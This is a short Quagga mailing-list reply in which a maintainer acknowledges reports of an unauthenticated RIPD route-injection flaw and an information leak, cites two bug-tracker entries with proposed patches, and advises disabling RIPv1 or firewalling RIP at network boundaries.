Subject: [quagga-users 6836] Re: Quagga RIPD unauthenticated route injection


Hi Konstantin,

Thanks for these reports. Quagga bug #262 has been opened for the 
issue below, see:

 	http://bugzilla.quagga.net/show_bug.cgi?id=262

The former report is assigned as Quagga bug #261:

 	http://bugzilla.quagga.net/show_bug.cgi?id=261

Comments are there regarding the scope of the information leak (the 
reply is unicasted with default TTL).

Bug #262 has proposed patches attached to solve both issues.

It does not restrict the scope of unicasted RIPv1 replies. It is 
suggested that users either disallow RIPv1 entirely or firewall RIP 
at network boundaries if RIPv1 must be used.

Thanks very much for your reports and assistance.
